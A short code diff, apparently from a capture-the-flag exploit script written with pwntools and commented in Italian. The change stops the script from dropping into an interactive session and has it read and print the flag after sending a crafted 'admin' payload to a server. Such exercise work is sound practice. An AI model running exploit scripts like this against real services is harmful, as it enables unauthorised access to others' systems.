@@ -54,4 +54,7 @@ payload = b'2\nadmin\n' + uno + b'\n' + due + b'\n'
 p.send(payload)
 # faccio arrivare tutto le risposte schifo del server, che non mi servono piu'
 p.recvuntil(b'personale:', timeout=180)
-p.interactive()
+p.recvuntil(b'admin')
+flag = p.recvuntil(b'}').decode().strip()
+p.close()
+print(flag)
